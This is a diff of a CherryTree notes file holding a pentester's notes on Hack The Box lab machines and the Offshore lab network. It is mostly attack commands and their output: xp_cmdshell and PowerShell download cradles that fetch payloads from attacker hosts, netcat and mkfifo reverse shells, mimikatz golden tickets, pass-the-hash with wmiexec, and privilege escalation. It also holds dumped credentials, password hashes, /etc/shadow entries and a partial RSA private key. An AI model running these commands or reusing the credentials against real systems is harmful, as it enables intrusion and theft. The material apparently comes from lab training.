@@ -1,7 +1,9 @@
 <?xml version="1.0" ?>
 <cherrytree>
-	<node custom_icon_id="0" foreground="" is_bold="False" name="querier" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1562161913.91" ts_lastsave="1562161917.77" unique_id="3">
-		<rich_text>1433/tcp open  ms-sql-s      Microsoft SQL Server  14.00.1000.00
+	<node custom_icon_id="0" foreground="" is_bold="False" name="Labs-Machines" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569853194.73" ts_lastsave="1569853258.53" unique_id="7">
+		<rich_text></rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="querier" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1562161913.91" ts_lastsave="1569853208.52" unique_id="3">
+			<rich_text>1433/tcp open  ms-sql-s      Microsoft SQL Server  14.00.1000.00
 | ms-sql-ntlm-info: 
 |   Target_Name: HTB
 |   NetBIOS_Domain_Name: HTB
@@ -79,16 +81,16 @@ password: corporate568
 ENABLE XP_CMDSHELL
 *Upload nc.exe to victim
 xp_cmdshell &quot;powershell.exe /c IEX (New-Object Net.WebClient).DownloadFile(\&quot;</rich_text>
-		<rich_text link="webs http://10.10.14.171:8000/nc.exe\&quot;,">http://10.10.14.171:8000/nc.exe\&quot;,</rich_text>
-		<rich_text> \&quot;c:\users\mssql-svc\documents\nc.exe\&quot;)&quot;
+			<rich_text link="webs http://10.10.14.171:8000/nc.exe\&quot;,">http://10.10.14.171:8000/nc.exe\&quot;,</rich_text>
+			<rich_text> \&quot;c:\users\mssql-svc\documents\nc.exe\&quot;)&quot;
 
 *Reverse shell
 xp_cmdshell &quot;cmd.exe /K C:\Users\mssql-svc\Documents\nc.exe 10.10.14.171 4444 -e cmd.exe&quot;
 
 Uploaded PowerUp.ps1
 powershell /c wget </rich_text>
-		<rich_text link="webs http://10.10.14.171:8000/PowerSploit-master/Privesc/PowerUp.ps1">http://10.10.14.171:8000/PowerSploit-master/Privesc/PowerUp.ps1</rich_text>
-		<rich_text> -outfile c:\users\mssql-svc\documents\PowerUp.ps1
+			<rich_text link="webs http://10.10.14.171:8000/PowerSploit-master/Privesc/PowerUp.ps1">http://10.10.14.171:8000/PowerSploit-master/Privesc/PowerUp.ps1</rich_text>
+			<rich_text> -outfile c:\users\mssql-svc\documents\PowerUp.ps1
 powershell.exe -nop -exec bypass
 Import-Module ./PowerUp.ps1
 
@@ -100,9 +102,9 @@ invoke-serviceabuse -name 'UsoSvc' -command &quot;cmd.exe /K C:\Users\mssql-svc\
 
 Password found in GPP
 Administrator:MyUnclesAreMarioAndLuigi!!1!</rich_text>
-	</node>
-	<node custom_icon_id="0" foreground="" is_bold="False" name="Friendzone" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1561923932.39" ts_lastsave="1562161913.91" unique_id="1">
-		<rich_text>SMB
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Friendzone" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1561923932.39" ts_lastsave="1569853210.99" unique_id="1">
+			<rich_text>SMB
 print$
 Files
 general (contains creds.txt)
@@ -132,16 +134,16 @@ friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200
 
 Added friendzone.red to /etc/hosts
 Connected to </rich_text>
-		<rich_text link="webs https://friendzone.red">https://friendzone.red</rich_text>
-		<rich_text>
+			<rich_text link="webs https://friendzone.red">https://friendzone.red</rich_text>
+			<rich_text>
 	- View source:
 	&lt;!-- Just doing some development here --&gt;
 	&lt;!-- /js/js --&gt;
 	&lt;!-- Don't go deep ;) --&gt;
 
 Connected to </rich_text>
-		<rich_text link="webs https://friendzone.red/js/js">https://friendzone.red/js/js</rich_text>
-		<rich_text>
+			<rich_text link="webs https://friendzone.red/js/js">https://friendzone.red/js/js</rich_text>
+			<rich_text>
 	- Contains
 	Testing some functions !
 	I'am trying not to break things !
@@ -150,20 +152,20 @@ Connected to </rich_text>
 
 Base64 Decoded: JXodhLDJX11561335715TeyIsKoVZ4 
 OneLiner: curl -k </rich_text>
-		<rich_text link="webs https://friendzone.red/js/js/">https://friendzone.red/js/js/</rich_text>
-		<rich_text> | awk -F&quot;\&gt;&quot; '{print $5}' | awk -F&quot;\&lt;&quot; '{print $1}' | base64 -d
+			<rich_text link="webs https://friendzone.red/js/js/">https://friendzone.red/js/js/</rich_text>
+			<rich_text> | awk -F&quot;\&gt;&quot; '{print $5}' | awk -F&quot;\&lt;&quot; '{print $1}' | base64 -d
 	- Seems to change every second
 
 Connected to </rich_text>
-		<rich_text link="webs https://administrator1.friendzone.red">https://administrator1.friendzone.red</rich_text>
-		<rich_text>
+			<rich_text link="webs https://administrator1.friendzone.red">https://administrator1.friendzone.red</rich_text>
+			<rich_text>
 	- Login Form for Friendzone
 	- Access with: admin:WORKWORKHhallelujah@# (creds.txt from general SMB share)
 	- Page contains: Login Done ! visit /dashboard.php
 
 Connected to </rich_text>
-		<rich_text link="webs https://administrator1.friendzone.red/dashboard.php">https://administrator1.friendzone.red/dashboard.php</rich_text>
-		<rich_text>
+			<rich_text link="webs https://administrator1.friendzone.red/dashboard.php">https://administrator1.friendzone.red/dashboard.php</rich_text>
+			<rich_text>
 	- Contains
 	Smart photo script for friendzone corp !
 	* Note : we are dealing with a beginner php developer and the application is not tested yet !
@@ -173,26 +175,26 @@ Connected to </rich_text>
 	default is image_id=a.jpg&amp;pagename=timestamp
 
 Connected to </rich_text>
-		<rich_text link="webs https://uploads.friendzone.red">https://uploads.friendzone.red</rich_text>
-		<rich_text>
+			<rich_text link="webs https://uploads.friendzone.red">https://uploads.friendzone.red</rich_text>
+			<rich_text>
 	- Ability to upload an image
 
 Connected to </rich_text>
-		<rich_text link="webs https://hr.friendzone.red">https://hr.friendzone.red</rich_text>
-		<rich_text>
+			<rich_text link="webs https://hr.friendzone.red">https://hr.friendzone.red</rich_text>
+			<rich_text>
 	- No webpage
 	- </rich_text>
-		<rich_text link="webs https://hr.friendzone.red/server-status">https://hr.friendzone.red/server-status</rich_text>
-		<rich_text> (Forbidden; No permissions)
+			<rich_text link="webs https://hr.friendzone.red/server-status">https://hr.friendzone.red/server-status</rich_text>
+			<rich_text> (Forbidden; No permissions)
 
 Uploaded a photo and browsed to: </rich_text>
-		<rich_text link="webs https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=1561674228">https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=1561674228</rich_text>
-		<rich_text>
+			<rich_text link="webs https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=1561674228">https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=1561674228</rich_text>
+			<rich_text>
 	- Got a Simpsons picture HAHA wrong parameter.
 
 </rich_text>
-		<rich_text link="webs https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=timestamp">https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=timestamp</rich_text>
-		<rich_text>
+			<rich_text link="webs https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=timestamp">https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=timestamp</rich_text>
+			<rich_text>
 	- Shows a message on Simpsons page. Final Access timestamp is 1561674492
 
 -----USER SHELL----
@@ -200,8 +202,8 @@ Uploaded a PHP Reverse Shell to the Developlent Share
 	curl --upload-file /home/scott/htb/friendzone/downloads/stuff.php -u 'Anonymous:Anonymous' smb://10.10.10.123/Development/
 Started listener
 Connected to </rich_text>
-		<rich_text link="webs https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=/etc/Development/revshell">https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=/etc/Development/revshell</rich_text>
-		<rich_text>
+			<rich_text link="webs https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=/etc/Development/revshell">https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=/etc/Development/revshell</rich_text>
+			<rich_text>
 python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
 
 Creds in /var/log/www/mysql_data.conf
@@ -233,12 +235,12 @@ Writable directory in /usr/lib/python2.7
                 for line in f:
                         f1.write(line)
 </rich_text>
-	</node>
-	<node custom_icon_id="0" foreground="" is_bold="False" name="Bastion" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1562002731.32" ts_lastsave="1562695638.58" unique_id="2">
-		<rich_text>** Fix broken flders
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Bastion" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1562002731.32" ts_lastsave="1569853213.19" unique_id="2">
+			<rich_text>** Fix broken flders
 </rich_text>
-		<rich_text family="monospace">fusermount -u /tmp/mtp</rich_text>
-		<rich_text>
+			<rich_text family="monospace">fusermount -u /tmp/mtp</rich_text>
+			<rich_text>
 
 PORTS
 
@@ -300,15 +302,15 @@ Cracked Password
     
  Password Decrypted using script
     - </rich_text>
-		<rich_text link="webs https://github.com/haseebT/mRemoteNG-Decrypt">https://github.com/haseebT/mRemoteNG-Decrypt</rich_text>
-		<rich_text>
+			<rich_text link="webs https://github.com/haseebT/mRemoteNG-Decrypt">https://github.com/haseebT/mRemoteNG-Decrypt</rich_text>
+			<rich_text>
     - ./mremoteng-decypt.py -s &quot;aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==&quot;
     - Administrator / thXLHM96BeKL0ER2
  
  </rich_text>
-	</node>
-	<node custom_icon_id="0" foreground="" is_bold="False" name="lacasadepapel" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1562695638.59" ts_lastsave="1562695706.5" unique_id="4">
-		<rich_text>21/tcp  open  ftp      vsftpd 2.3.4
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="lacasadepapel" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1562695638.59" ts_lastsave="1569853215.52" unique_id="4">
+			<rich_text>21/tcp  open  ftp      vsftpd 2.3.4
 22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
 | ssh-hostkey:
 |   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)                                                  
@@ -333,5 +335,2344 @@ Cracked Password
 Service Info: OS: Unix
 
 </rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="WriteUp" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1563469003.24" ts_lastsave="1569853217.72" unique_id="5">
+			<rich_text>10.10.10.138
+
+NMAP RESULTS
+    22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+    | ssh-hostkey: 
+    |   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
+    |   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
+    |_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
+    80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+    | http-robots.txt: 1 disallowed entry 
+    |_/writeup/
+    |_http-server-header: Apache/2.4.25 (Debian)
+    |_http-title: Nothing here yet.
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Scanning port 80 to closees the port temporarly
+
+    </rich_text>
+			<rich_text link="webs http://10.10.10.138/writeup/">http://10.10.10.138/writeup/</rich_text>
+			<rich_text>
+    </rich_text>
+			<rich_text link="webs http://10.10.10.138/writeup/index.php?page=ypuffy">http://10.10.10.138/writeup/index.php?page=ypuffy</rich_text>
+			<rich_text>
+    </rich_text>
+			<rich_text link="webs http://10.10.10.138/writeup/index.php?page=blue">http://10.10.10.138/writeup/index.php?page=blue</rich_text>
+			<rich_text>
+    </rich_text>
+			<rich_text link="webs http://10.10.10.138/writeup/index.php?page=writeup">http://10.10.10.138/writeup/index.php?page=writeup</rich_text>
+			<rich_text>
+
+Found webpage was running CMS Made Simple from looking at the source code in burp suite
+
+CMS Made Simple Admin Page
+    </rich_text>
+			<rich_text link="webs http://10.10.10.138/writeup/admin">http://10.10.10.138/writeup/admin</rich_text>
+			<rich_text>
+    
+SQL Injection exploit to get admin password
+    - </rich_text>
+			<rich_text link="webs https://www.exploit-db.com/exploits/46635">https://www.exploit-db.com/exploits/46635</rich_text>
+			<rich_text>
+    - ./cms-exploit.py -u </rich_text>
+			<rich_text link="webs http://10.10.10.138">http://10.10.10.138</rich_text>
+			<rich_text> -w /usr/share/wordlist/rockyou.txt -c
+    - RESULTS
+        [+] Salt for password found: 5a599ef579066807
+        [+] Username found: jkr
+        [+] Email found: jkr@writeup.htb
+        [+] Password found: 62def4866937f08cc13bab43bb14e6f7
+        [+] Password cracked: raykayjay9
+        
+Potential privesc using elogind
+    - </rich_text>
+			<rich_text link="webs https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html">https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html</rich_text>
+			<rich_text>
+
+OTHER STUFF
+
+Found jkr apache password
+    - Located at: /etc/apache2/passwords
+    - jkr:$apr1$zXpnkbX6$LPzyE8Wa0d1yNQ4/F8aQa.
+
+htpasswd files (hashcat -m 1600)
+    /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_wrongrelm/.htpasswd
+    username:wrongrelm:99cd340e1283c6d0ab34734bd47bdc30
+    4105bbb04
+    /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_anon/.htpasswd
+    username:digest anon:25e4077a9344ceb1a88f2a62c9fb60d8
+    05bbb04
+    anonymous:digest anon:faa4e5870970cf935bb9674776e6b26a
+    /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/authz_owner/.htpasswd
+    username:$apr1$1f5oQUl4$21lLXSN7xQOPtNsj5s4Nk/
+    /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/file/.htpasswd
+    username:$apr1$uUMsOjCQ$.BzXClI/B/vZKddgIAJCR.
+    /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_time/.htpasswd
+    username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04
+    /usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest/.htpasswd
+    username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Heist" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1568752659.48" ts_lastsave="1569853242.93" unique_id="6">
+			<rich_text>Hostname: supportdesk
+Domain: supportdesk
+Windows 10 Build 17763
+
+PORT    STATE SERVICE       VERSION
+80/tcp  open  http          Microsoft IIS httpd 10.0
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+| http-title: Support Login Page
+|_Requested resource was login.php
+135/tcp open  msrpc         Microsoft Windows RPC
+445/tcp open  microsoft-ds?
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 19h14m14s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2019-09-18T15:49:26
+|_  start_date: N/A
+
+Guest Login Page
+Username in support post: Hazard
+
+Router config - </rich_text>
+			<rich_text link="webs http://10.10.10.149/attachments/config.txt">http://10.10.10.149/attachments/config.txt</rich_text>
+			<rich_text>
+    hostname ios-1
+    !
+    security passwords min-length 12
+    enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
+    !
+    username rout3r password 7 0242114B0E143F015F5D1E161713 - $uperP@ssword
+    username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 - Q4)sJu\Y8qz*A3?d
+    
+ Site issues session cookie
+    
+ </rich_text>
+		</node>
+	</node>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="Offshore" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569853258.53" ts_lastsave="1571838960.59" unique_id="8">
+		<rich_text>SYSTEMS
+
+CORP.LOCAL:
+    DCO1                       172.16.1.5 
+    WEB-WIN01              172.16.1.24
+    FS01                        172.16.1.26
+    WS02                       172.16.1.101
+    SQL01                      172.16.1.15
+    WSADM                    172.16.1.36
+    MS01                        172.16.1.30
+    
+ WEB.LOCAL:
+    NIX01                       172.16.1.23 : 10.10.110.123
+    NIX02                       10.10.110.124
+    WIN01
+    
+ DEV.LOCAL
+    DC02
+    WS03
+    
+ ADMIN.LOCAL
+    DC03
+    WS04
+    
+ CLIENT.LOCAL
+    DC04
+    MS02
+    NIX03
+    </rich_text>
+		<rich_text justification="left"></rich_text>
+		<table char_offset="573" col_max="60" col_min="40">
+			<row>
+				<cell>CORP.LOCAL</cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+			</row>
+			<row>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+			</row>
+			<row>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+			</row>
+			<row>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+			</row>
+			<row>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+			</row>
+			<row>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+			</row>
+			<row>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+			</row>
+			<row>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+			</row>
+			<row>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+			</row>
+			<row>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+			</row>
+			<row>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+			</row>
+			<row>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+			</row>
+			<row>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+			</row>
+			<row>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+			</row>
+			<row>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+			</row>
+			<row>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+			</row>
+			<row>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+			</row>
+			<row>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+			</row>
+			<row>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+			</row>
+			<row>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+			</row>
+			<row>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+			</row>
+			<row>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+			</row>
+			<row>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+			</row>
+			<row>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+			</row>
+			<row>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+				<cell></cell>
+			</row>
+			<row>
+				<cell>Domain</cell>
+				<cell>Hostname</cell>
+				<cell>IP Address</cell>
+				<cell>Operating System</cell>
+				<cell>click me</cell>
+				<cell>click me</cell>
+			</row>
+		</table>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Initial Connection Commands" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570061171.7" ts_lastsave="1571920021.13" unique_id="25">
+			<rich_text>#Proxychains
+    ssh -NfD 9050 root@10.10.110.123 -i /home/user/htb/offshore/DMZ/10.10.110.123/ssh-key
+    ssh -D 9050 root@10.10.110.123 -i /home/user/htb/offshore/DMZ/10.10.110.123/ssh-key
+#SSH Port Fwd
+    user@squirrel:~/htb/offshore/Internal/crack$ ssh -NfL 127.0.0.1:8000:172.16.1.24:80 root@10.10.110.123 -i /home/user/htb/offshore/DMZ/10.10.110.123/ssh-key
+
+#DC01-&gt;DC02-&gt;DC03
+- proxychains crackmapexec 172.16.1.5 -u iamtheadministrator -H 15da52f659978026ba6c3b28663ed959 --exec-method smbexec -x &quot;powershell iex (new-object net.webclient).downloadstring('</rich_text>
+			<rich_text link="webs http://10.10.14.6/update')&quot;">http://10.10.14.6/update')&quot;</rich_text>
+			<rich_text>
+   → mimikatz kerberos::golden /admin:jason /domain:dev.admin.offshore.com /sid:S-1-5-21-1416445593-394318334-2645530166 /sids:S-1-5-21-1216317506-3509444512-4230741538-519 /krbtgt:9404def404bc198fd9830a3483869e78 /startoffset:0 /endin:600 /renewmax:10080 /ptt
+- psexec_psh dc02.dev.admin.offshore.com smb
+   → execute-assembly /opt/tools/CSharp_Tools/Rubeus.exe asktgt /user:Administrator /enctype:AES256 /aes256:b94c517e4db5971ac924bf79ca7b20cd3db49a8bd734194cb15d6786316d00e1 /domain:admin.offshore.com /dc:dc03 /ptt
+- psexec_psh dc03.admin.offshore.com smb
+
+
+#WS03 (Dev)
+proxychains python /usr/share/doc/python-impacket/examples/wmiexec.py -hashes 0:c718f548c75062ada93250db208d3178 svc_devops@172.16.2.102 &quot;powershell iex (new-object net.webclient).downloadstring('</rich_text>
+			<rich_text link="webs http://10.10.14.6/update')&quot;">http://10.10.14.6/update')&quot;</rich_text>
+			<rich_text>
+
+#DC02
+proxychains python /usr/share/doc/python-impacket/examples/wmiexec.py -hashes 0:31d6cfe0d16ae931b73c59d7e0c089c0 joe@172.16.2.6 &quot;powershell iex (new-object net.webclient).downloadstring('</rich_text>
+			<rich_text link="webs http://10.10.14.6/update')&quot;">http://10.10.14.6/update')&quot;</rich_text>
+			<rich_text>
+
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="DMZ" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569854575.71" ts_lastsave="1570562312.44" unique_id="10">
+			<rich_text></rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="10.10.110.123" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569855595.74" ts_lastsave="1569932041.29" unique_id="11">
+				<rich_text>HOSTNAME: NIX01
+IP ADDR (Ext): 10.10.110.123
+IP ADDR (Int): 172.16.1.23
+
+Gobuster Results
+/images (Status: 301)
+/index.html (Status: 200)
+/css (Status: 301)
+/js (Status: 301)
+/fonts (Status: 301)
+/reboot.php (Status: 200)
+
+
+Reboot Splunk instance link
+ - </rich_text>
+				<rich_text link="webs http://10.10.110.123/reboot.php">http://10.10.110.123/reboot.php</rich_text>
+				<rich_text>
+ 
+Splunk Login ( Splunk Enterprise Sever 7.0.2)
+
+ - </rich_text>
+				<rich_text link="webs http://10.10.110.123:8000/en-US/app/launcher/home">http://10.10.110.123:8000/en-US/app/launcher/home</rich_text>
+				<rich_text>
+ 
+Possible Exploit
+- </rich_text>
+				<rich_text link="webs https://www.n00py.io/2018/10/popping-shells-on-splunk/">https://www.n00py.io/2018/10/popping-shells-on-splunk/</rich_text>
+				<rich_text>
+
+
+==User Shell==
+    Current User: Mark
+    Uploaded Shell Splunk App
+      - </rich_text>
+				<rich_text link="webs https://github.com/TBGSecurity/splunk_shells">https://github.com/TBGSecurity/splunk_shells</rich_text>
+				<rich_text>
+      - </rich_text>
+				<rich_text link="webs https://www.n00py.io/2018/10/popping-shells-on-splunk/">https://www.n00py.io/2018/10/popping-shells-on-splunk/</rich_text>
+				<rich_text>
+
+    Created Multi Handler in Metasploit
+      - payload python/shell_reverse_tcp
+      - In splunk search: '| revshell std 10.10.14.6 8443
+
+    How to upload file to target (Not required at this point)
+      - Uploaded to host: curl -o /tmp/update.py </rich_text>
+				<rich_text link="webs http://10.10.14.6:8000/payload.py">http://10.10.14.6:8000/payload.py</rich_text>
+				<rich_text>
+
+    Upgraded Shell
+      - rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.14.6 5555 &gt;/tmp/f
+      - nc -lvp 555
+
+    ==Postgres User==
+    Postgres home dir: </rich_text>
+				<rich_text link="fold L3Zhci9saWIvcG9zdGdyZXNxbA==">/var/lib/postgresql</rich_text>
+				<rich_text>
+    Connected to PostgreSQL
+      * PostgreSQL command execution: </rich_text>
+				<rich_text link="webs https://www.unix-ninja.com/p/postgresql_for_red_teams">https://www.unix-ninja.com/p/postgresql_for_red_teams</rich_text>
+				<rich_text>
+      * PostgresSQL execution script: </rich_text>
+				<rich_text link="webs https://github.com/Dionach/pgexec">https://github.com/Dionach/pgexec</rich_text>
+				<rich_text>
+      - /usr/local/pgsql/bin/psql -U postgres
+      - Uploaded bash script from Dionach (pg_exec.sh)
+         → Started listener: nc -lvp 8443
+         → Executed: /tmp/exec.sh -U postgres -e '/tmp/test2' -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.14.6 8433 &gt;/tmp/f'
+            ⇒ **MUST DO FIRST: PATH=&quot;/usr/local/pgsql/bin:$PATH&quot;
+     - postgres is in the ssl-cert group which has access to /etc/ssl/private
+     
+         [+] We can sudo without supplying a password!
+    Matching Defaults entries for postgres on NIX01:
+        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+    User postgres may run the following commands on NIX01:
+        (ALL) NOPASSWD: /usr/bin/tail
+
+==Root User==
+    - ssh root@10.10.110.123 -i /home/user/htb/offshore/DMZ/10.10.110.123/ssh-key
+        * ssh-key must have 400 permissions
+
+
+    - sudo tail -n +1 /etc/shadow
+        root:$6$UM9dnBFE$5LRqppNoZhJmLz0.cLGlZXeDWYjy4u4MWbTW/8vMu.vSCbhTFlCLDsRvtxj8kF1RrlbCeyJHitm9g9.pLe4uM1:17652:0:99999:7:::
+        daemon:*:17001:0:99999:7:::
+        bin:*:17001:0:99999:7:::
+        sys:*:17001:0:99999:7:::
+        sync:*:17001:0:99999:7:::
+        games:*:17001:0:99999:7:::
+        man:*:17001:0:99999:7:::
+        lp:*:17001:0:99999:7:::
+        mail:*:17001:0:99999:7:::
+        news:*:17001:0:99999:7:::
+        uucp:*:17001:0:99999:7:::
+        proxy:*:17001:0:99999:7:::
+        www-data:*:17001:0:99999:7:::
+        backup:*:17001:0:99999:7:::
+        list:*:17001:0:99999:7:::
+        irc:*:17001:0:99999:7:::
+        gnats:*:17001:0:99999:7:::
+        nobody:*:17001:0:99999:7:::
+        systemd-timesync:*:17001:0:99999:7:::
+        systemd-network:*:17001:0:99999:7:::
+        systemd-resolve:*:17001:0:99999:7:::
+        systemd-bus-proxy:*:17001:0:99999:7:::
+        syslog:*:17001:0:99999:7:::
+        _apt:*:17001:0:99999:7:::
+        messagebus:*:17564:0:99999:7:::
+        uuidd:*:17564:0:99999:7:::
+        mark:$6$J7gvzz87$jy.tjUc9mWJHy5nxZtuqtXcX6zJdCAE8eX87rZfzEE0zaV8rKHyzNQ5YWzSn/ust0Y96sMRCWrFEkGhv5QD.O/:17642:0:99999:7:::
+        sshd:*:17564:0:99999:7:::
+        splunk:!:17564:0:99999:7:::
+        postgres:$6$ZQdBsxBU$YZeJIBNXNEJIWv5cwwGnuHrfxL04zaj1GXE0NhgL8pvmSgU2Csb/HTdesfPb7NY4ru7/UXa7Dvy/BynKzJLlI/:17758:0:99999:7:::
+        
+        SSH RSA Key
+        -----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAoqnXGZVkxIu7Y9+Bln8k1irzetIT+WkRLHeHvj1Hv0FV/JOO
+cqAatFMmCe7NERWu+x2yrT/JT9kdb/Z0YS5WLEbWdxJihhgj1YTwRLjRw818Uxyr
+HBGufOU4rHmitZAMVWiPIgZS/+7dxt4PEhxVdj2MJMTzzvo4MU1NBWfQt8p/i6kw
+HKH93iCrUHvUsDqHbJnK9Z03QL5ZaGN7hPntHUDLLpOvBO9e2sjUJAUuu2HUeNGf
+OtYEBEe3J21FSUTucoXiEzSEg5eyK/X6JywELbPB4wfB+vDNN1D8GIQdemX1HjrI
+Wm3F/WnZ3wXzYQRAg44SsZHherfVKPM8J/jv6QIDAQABAoIBAFyAgy8sUtqmr9Dy
+6InCEhus3ztoPi2mfzqvWsVnqeZsbE6vRuGOhMEpS8d4QqvFjfWGBPcbAAtlZ6Ul
